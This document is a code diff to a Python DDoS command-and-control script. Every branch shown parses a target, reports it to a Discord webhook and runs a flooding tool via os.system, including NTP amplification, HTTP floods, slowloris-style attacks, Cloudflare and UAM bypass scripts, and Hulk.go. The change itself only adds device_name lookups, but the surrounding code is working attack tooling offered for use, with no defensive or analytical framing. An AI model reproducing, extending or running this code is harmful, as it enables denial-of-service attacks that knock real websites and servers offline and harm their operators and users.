@@ -392,6 +392,7 @@ def main():
                 port = cnc.split()[2]
                 throttle = cnc.split()[3]
                 time = cnc.split()[4]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nNTP\n---------------\nTarget: {ip}:{port}\nThrottle: {throttle}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
             except IndexError:
@@ -406,6 +407,7 @@ def main():
                 ip = cnc.split()[2]
                 port = cnc.split()[3]
                 time = cnc.split()[4] 
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nOVH-BEAM\n---------------\nTarget: {ip}:{port}\nMethod: {method}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
             except IndexError:
@@ -417,6 +419,7 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nSPOOF\n---------------\nTarget: {url}\nTime: {time}\nThreads: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'python3 https-spoof.py {url} {time} {thread}')
             except IndexError:
@@ -427,6 +430,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nSLOW\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node slow.js {url} {time}')
             except IndexError:
@@ -437,6 +441,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nHYPER\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node hyper.js {url} {time}')
             except IndexError:
@@ -465,6 +470,7 @@ def main():
                 url = cnc.split()[1]
                 per = cnc.split()[2]
                 time = cnc.split()[3]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-SOCKET\n---------------\nTarget: {url}\nPer: {per}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node HTTP-SOCKET {url} {per} {time}')
             except IndexError:
@@ -475,6 +481,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-RAW\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node HTTP-RAW {url} {time}')
             except IndexError:
@@ -485,6 +492,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-REQUEST\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node HTTP-REQUESTS {url} {time}')
             except IndexError:
@@ -495,6 +503,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-RAND\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node HTTP-RAND.js {url} {time}')
             except IndexError:
@@ -506,6 +515,7 @@ def main():
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 thread = cnc.split()[3]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nOVERFLOW\n---------------\nTarget: {ip}:{port}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'./OVERFLOW {ip} {port} {thread}')
             except IndexError:
@@ -517,6 +527,7 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nCF BYPASS\n---------------\nTarget: {url}Time: {time}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node cf.js {url} {time} {thread}')
             except IndexError:
@@ -528,6 +539,7 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 per = cnc.split()[3]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nUAM BYPASS\n---------------\nTarget: {url}\nTime: {time}\nPer: {per}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'node uambypass.js {url} {time} {per} http.txt')
             except IndexError:
@@ -538,6 +550,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
+                device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nCRASH\n---------------\nTarget: {url}\nMethod: {method}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                 os.system(f'go run Hulk.go -site {url} -data {method}')
             except IndexError:
@@ -550,6 +563,7 @@ def main():
                 thread = cnc.split()[2]
                 method = cnc.split()[3]
                 time = cnc.split()[4]
+                device_name = platform.system()
                 os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
             except IndexError:
                 print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
